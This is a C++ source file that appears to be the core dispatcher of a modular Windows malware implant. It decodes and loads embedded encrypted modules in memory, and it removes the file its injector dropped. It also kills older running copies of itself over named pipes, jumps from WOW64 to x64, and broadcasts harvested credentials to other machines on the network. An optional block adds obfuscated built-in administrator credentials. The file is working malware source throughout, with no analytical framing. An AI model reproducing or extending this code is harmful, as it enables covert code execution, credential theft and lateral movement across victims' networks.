/*
	WorkDispatcher.cpp
	Core dll's routines from work dispatcher dll
*/

#include <windows.h>

#include "mem.h"
#include "dbg.h"
#include "PELoader.h"
#include "CredManager.h"
#include "MailslotWorks.h"
#include "DomainListMachines.h"
#include "PipeWorks.h"
#include "DataCallbackManager.h"
#include "EmbeddedResources.h"
#include "SecureClean.h"
//#include "NetMessageEnvelope.h"
#if defined(_M_IX86)
#include "WOW64Detect.h"
#include "Wow64Jump.h"
#endif

#include "..\Shellcode\shellcode.h"
#include "..\shared\ModuleDescriptor.h"
#include "..\shared\ModuleAPI.h"
#include "..\shared\CommStructures.h"
#include "..\shared\config.h"

#include "WorkDispatcher.h"

// arch-specific definition
#if defined(_M_X64)
	#define TARGET_ARCH ARCH_TYPE_X64
#elif defined(_M_IX86)
	#define TARGET_ARCH ARCH_TYPE_X32
#endif

CORE_APIS gCoreAPIs;	// main structure with apis exposed to all the modules


/*
	Prepares, decodes and executes module enumed at wdStartModules()
	NB: caller is holding cs list lock while calling this function
*/
BOOL wdStartModule(EMBEDDEDRESOURCE_LIST_CHUNK *elItem)
{
	BOOL bRes = FALSE;
	LPVOID pEncBuffer;		// buffer with a copy of data from elItem

	// decoded buffers
	LPVOID pPE = NULL;
	DWORD dwPELen = 0;

	// pe-related
	LPVOID pImage;
	LPVOID pEntry;
	SIZE_T lImageSize;
	EntryPoint EP;

	// alloc and copy mem
	pEncBuffer = my_alloc(elItem->er.opts.dwChunkLen);
	memcpy(pEncBuffer, elItem->er.pChunk, elItem->er.opts.dwChunkLen);

	// do decoding
	if (erUnpackResourceBuffer(&elItem->er, pEncBuffer, elItem->er.opts.dwChunkLen, &pPE, &dwPELen, NULL, TRUE)) {

		// load in-mem
		if (PELoad(pPE, &pImage, &lImageSize, &pEntry)) {

			DbgPrint("module loaded at %04Xh len %u bytes", pImage, lImageSize);
			EP = (EntryPoint)pEntry;

			__try {

				if (!EP(NULL, DLL_PROCESS_ATTACH, &gCoreAPIs)) {

					DbgPrint("ERR: EP returned FALSE, deallocating module");
					VirtualFree(pImage, 0, MEM_RELEASE);

				} else { DbgPrint("init OK"); bRes = TRUE; }
				 
			} __except (1) { DbgPrint("ERR: exception while calling EP of module"); }

		} // pe loaded

		// free not needed anymore
		my_free(pPE);

	} else { DbgPrint("ERR: failed to unpack"); }

	// free used mem
	my_free(pEncBuffer);

	return bRes;
}

/*
	Enums appended chunks at binpack and executes modules
*/
VOID wdStartModules(SHELLCODE_CONTEXT *sc)
{
	EMBEDDEDRESOURCE_LIST_CHUNK *elItem = NULL;	// list item currently being processed
	// derivatives from dwChunkOptions
	RES_TYPE rt;
	ARCH_TYPE at;
	WORD wModuleId;

	DbgPrint("entered, sc=%04Xh", sc);



	DbgPrint("searching for modules");

	// do enum of all working modules and exec it
	_erEnterLock();
	__try {

		while (elItem = _erEnumFromChunk(elItem)) {

			// check item to be a module with our arch
			_erGetParamsFromOptions(elItem->er.opts.dwChunkOptions, &rt, &at, &wModuleId);
			if ((at == TARGET_ARCH) && (rt == RES_TYPE_MODULE)) {

				DbgPrint("processing moduleid %04Xh", wModuleId);

				wdStartModule(elItem);

			} // type and arch check

		} // while have more items

	} __except (1) { DbgPrint("ERR: exception catched"); }
	_erLeaveLock();
}



/*
	Fill global var with all left api ptrs
*/
VOID _wdFillGlobals()
{
	// libraries - query funcs into global var
	DbgPrint("entered");
	gCoreAPIs.HashedStrings_apis =		(HashedStrings_ptrs *)my_alloc(sizeof(HashedStrings_ptrs));				HashedStrings_imports(gCoreAPIs.HashedStrings_apis);
	gCoreAPIs.PipeWorks_apis =			(PipeWorks_ptrs *)my_alloc(sizeof(PipeWorks_ptrs));						PipeWorks_imports(gCoreAPIs.PipeWorks_apis);
	gCoreAPIs.DomainListMachines_apis = (DomainListMachines_ptrs *)my_alloc(sizeof(DomainListMachines_ptrs));	DomainListMachines_imports(gCoreAPIs.DomainListMachines_apis);
	gCoreAPIs.CredManager_apis =		(CredManager_ptrs *)my_alloc(sizeof(CredManager_ptrs));					CredManager_imports(gCoreAPIs.CredManager_apis);
	gCoreAPIs.EmbeddedResources_apis =	(EmbeddedResources_ptrs *)my_alloc(sizeof(EmbeddedResources_ptrs));		EmbeddedResources_imports(gCoreAPIs.EmbeddedResources_apis);
	gCoreAPIs.MyStringRoutines_apis =	(MyStringRoutines_ptrs *)my_alloc(sizeof(MyStringRoutines_ptrs));		MyStringRoutines_imports(gCoreAPIs.MyStringRoutines_apis);
	gCoreAPIs.CryptoStrings_apis =		(CryptoStrings_ptrs *)my_alloc(sizeof(CryptoStrings_ptrs));				CryptoStrings_imports(gCoreAPIs.CryptoStrings_apis);
	gCoreAPIs.RndClass_apis =			(RndClass_ptrs *)my_alloc(sizeof(RndClass_ptrs));						RndClass_imports(gCoreAPIs.RndClass_apis);
	gCoreAPIs.DataCallbackManager_apis = (DataCallbackManager_ptrs *)my_alloc(sizeof(DataCallbackManager_ptrs));	DataCallbackManager_imports(gCoreAPIs.DataCallbackManager_apis);
	gCoreAPIs.CommStructures_apis =		(CommStructures_ptrs *)my_alloc(sizeof(CommStructures_ptrs));			CommStructures_imports(gCoreAPIs.CommStructures_apis);
	gCoreAPIs.MailslotWorks_apis =		(MailslotWorks_ptrs *)my_alloc(sizeof(MailslotWorks_ptrs));				MailslotWorks_imports(gCoreAPIs.MailslotWorks_apis);
	DbgPrint("finished");

}


/*
	Thread waiting infinite to remove a file passed by injector at
	SHELLCODE_CONTEXT structure
	TODO: perform secure file deletion with content's wipe instead of DeleteFile()
*/
DWORD WINAPI thrFileRemover(LPVOID lpParameter)
{
	LPWSTR wszFileToRemove = (LPWSTR)lpParameter;

	DbgPrint("starting file removal for [%ws]", wszFileToRemove);

	while (!scSecureDeleteFile(wszFileToRemove)) { Sleep(2500); }

	DbgPrint("file [%ws] was removed", wszFileToRemove);

	return 0;
}


/*
	Checks context for a command to remove a file
*/
VOID wdCheckNeedFileRemoval(SHELLCODE_CONTEXT *sc)
{
	LPWSTR wszFileToRemove;	// buffer to copy file to be removed
	DWORD dwThreadId;

	DbgPrint("entered");

	if (sc->bRemoveFilePath[0]) {

		wszFileToRemove = (LPWSTR)my_alloc(1024);
		lstrcpy(wszFileToRemove, (LPWSTR)&sc->bRemoveFilePath[0]);

		DbgPrint("file to remove: [%ws]", wszFileToRemove);

		// create file removal thread
		CloseHandle(CreateThread(NULL, 0, thrFileRemover, (LPVOID)wszFileToRemove, 0, &dwThreadId));

	} else { DbgPrint("NOTE: no file to be removed specified"); }	// file defined

}

DWORD WINAPI thrSelfTermination(LPVOID lpParameter)
{
	DbgPrint("entered, waiting...");

	Sleep(5000);

	DbgPrint("done, exiting");

	ExitProcess(0);

}

// define target-specific value to be used to allow termination
#define WDD_TERMINATION_HASH (TARGET_BUILDCHAIN_HASH ^ HASHSTR_CONST("termination hash value check", 0x11aabb392082a626))

BOOL CALLBACK wdcbTerminationCommand(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	BOOL bRes = FALSE;	// by default, tell we were unable to process data, and let it go to other registered callbacks
	DWORD dwThreadId;	

	TERMINATION_QUERY *tq;	// input data casted ptr
	TERMINATION_QUERY *tqa;	// answer buffer

	do {	// not a loop

		// check for mailslot source with MMI_CREDENTIALS id from header
		if ((dcp->csType == ST_PIPE) && (dcp->bInputMessageId == PMI_TERMINATE_HOST_PROCESS_IF_LOWER_VERSION) && (dcp->lInBufferLen == sizeof(TERMINATION_QUERY))) {

			// check value
			tq = (TERMINATION_QUERY *)dcp->pInBuffer;
			if (tq->i64TerminationHash != WDD_TERMINATION_HASH) { DbgPrint("ERR: invalid termination hash, cmd refused"); break; }

			DbgPrint("termination query received, caller ver=%u, our ver=%u", tq->wBuildId, BUILD_ID);

			// check if need to create self exit thread
			if (tq->wBuildId > BUILD_ID) {

				// startup termination thread, in order to send result to caller
				DbgPrint("NOTE: caller has higher version, starting self termination");
				CloseHandle(CreateThread(NULL, 0, thrSelfTermination, NULL, 0, &dwThreadId));

			} // caller has a higher build id

			// prepare answer
			tqa = (TERMINATION_QUERY *)my_alloc(sizeof(TERMINATION_QUERY));
			tqa->i64TerminationHash = tq->i64TerminationHash;
			tqa->wBuildId = BUILD_ID;

			// assign answer to be sent to caller
			dcp->pAnswer = tqa;
			dcp->lAnswerLen = sizeof(TERMINATION_QUERY);

			bRes = TRUE;

		} // check size

	} while (FALSE);	// not a loop

	return bRes;
}


/*
	Issues special pipe command in order to self-terminate other versions which may be running
	Returns TRUE if termination was successfull
*/
BOOL wdTerminateOtherRunning()
{
	BOOL bRes = FALSE;
	
	// _pwRemotePipeCheckSend() params
	LPVOID pAnswer = NULL;
	DWORD dwAnswerLen = 0;
	BYTE bMsgId = PMI_TERMINATE_HOST_PROCESS_IF_LOWER_VERSION;
	TERMINATION_QUERY tq = { 0 };
	TERMINATION_QUERY *ptqa = NULL;	// to cast answer ptr

	BOOL bDoSelfTermination = FALSE;	// indicates if we need to perform immediate self termination due to versions check 

	do { // not a loop

		if (!pwIsRemotePipeWorkingTimeout(NULL, 5000, 200)) { DbgPrint("no local pipe server running"); break; }

		DbgPrint("NOTE: found running local pipe server, sending termination cmd");

		// data to be sent
		tq.i64TerminationHash = WDD_TERMINATION_HASH;
		tq.wBuildId = BUILD_ID;
		if (!_pwRemotePipeCheckSend(NULL, 5000, 200, &tq, sizeof(TERMINATION_QUERY), &pAnswer, &dwAnswerLen, &bMsgId)) { DbgPrint("ERR: pipe send failed"); break; }

		DbgPrint("pipe cmd sent OK");

		// answer check
		if (dwAnswerLen != sizeof(TERMINATION_QUERY)) { DbgPrint("ERR: answer size expected %u, received %u", sizeof(TERMINATION_QUERY), dwAnswerLen); break; }
		ptqa = (TERMINATION_QUERY *)pAnswer;
		if (ptqa->i64TerminationHash != tq.i64TerminationHash) { DbgPrint("ERR: answer hash invalid, looks like other target, terminating self"); bDoSelfTermination = TRUE; break; }
		if (ptqa->wBuildId >= tq.wBuildId) { DbgPrint("no need to run, self version %u, existent version %u", tq.wBuildId, ptqa->wBuildId); bDoSelfTermination = TRUE; break; }

		DbgPrint("OK: cmd is being executed, waiting 10s"); 
		Sleep(10000); 
		bRes = TRUE; 


	} while (FALSE);	// not a loop

	// check for self termination
	if (bDoSelfTermination) { ExitProcess(0); }

	// free buffs, if any
	if (pAnswer) { my_free(pAnswer); }

	return bRes;
}


/*
	Performs main init, called from work dispatcher dll's DllMain
*/
VOID WorkDispatcherInit(SHELLCODE_CONTEXT *sc)
{
	DWORD dwTermCount = 0;

	DbgPrint("entered");

	// init internal interfaces exposed to modules to be executed
	// NB: due to stdlibs removed, globals should be initialized manually
	memset(&gCoreAPIs, 0, sizeof(CORE_APIS));
	dcmInit();	// data callback manager init

	// check if some caller specified file to be removed at SHELLCODE_CONTEXT
	wdCheckNeedFileRemoval(sc);

	// register modules placed at binpack after shellcode's context and 2 modules
	// need to perform it at this step due to possible WOW64 x32->x64 jump
	erRegisterModules((LPVOID)((SIZE_T)sc + sc->dwStructureLen + sc->dwShellcodeLen + sc->dwIDDLen + sc->dwWDDLen));

	// x32 - specific init code
#if defined(_M_IX86)
	// if WOW64 detected, do a jump via rse x64 on-disk run
	// in case of success, routine will terminate current process
	// in case of failute, we will continue execution and init as usual
	if (IsX64Windows()) { DbgPrint("NOTE: detected WOW64"); wjWow64JumpTo64(); }
#endif

	// register internal callbacks
	dcmAddDataCallback(cmMailslotBroadcastInProcessingDataCallback);	// cb from CredManager waiting for mailslot broadcast with remote creds

	// issue termination command to local running copy
	// due to nature of pipe server, several processes may serve a pipe, so run this function until it finds no other pipe servers
	// to prevent infinite loop due to some internal error, use max iteration counter
	// NB: this function may terminate host if detected a higher existing version via termination request
	while (wdTerminateOtherRunning() && (dwTermCount < 32)) { dwTermCount++; DbgPrint("terminated %u copy", dwTermCount); }

	// start transports which links data with our CB-manager
	pwInitPipeServerAsync(dcmGetServerCallback());
	mwInitMailslotServer(dcmGetServerCallback());

	// termination callback to support wdTerminateOtherRunning() call from other(newer) versions
	dcmAddDataCallback(wdcbTerminationCommand);

	// fill global CORE_APIS structure, used by modules
	_wdFillGlobals();

	// do enum and start modules from binpack - and send CORE_APIS to it 
	wdStartModules(sc);

	// start broadcasting creds to other machines
	cmStartupNetworkBroadcaster();


	// add built-in creds
#ifdef ADD_BUILTIN_CREDS
	ADD_CREDS_RECORD acr = { 0 };
	FILETIME ftNow = cmftNow();
	acr.coOrigin = CRED_ORIGIN_LOCAL;
	acr.dwLen = sizeof(ADD_CREDS_RECORD);
	acr.ftGathered = ftNow;
	acr.ftReceived = ftNow;
	acr.wszDomain = CRSTRW("WKS001", "\x00\x20\x25\x0e\x06\x20\x12\x2d\x23\x68\x95\xb7\x08\x26\x31");			
	acr.wszUsername = CRSTRW("administrator", "\xfd\x3f\xba\x03\xf0\x3f\xbb\x0f\xe0\x2e\x54\xe2\x1e\xd3\x68\xca\x39\xe8\x08");		
	acr.wszPassword = CRSTRW("Dgth`l Hjccbz", "\xfc\xbf\x98\x01\xf1\xbf\xbc\x0e\xf8\xaf\x78\xe5\x4c\x6f\x52\xca\x2f\x65\x22");
	cmAddCredentials(&acr);
	my_free(acr.wszDomain);
	my_free(acr.wszUsername);
	my_free(acr.wszPassword);
#endif

	DbgPrint("done");

}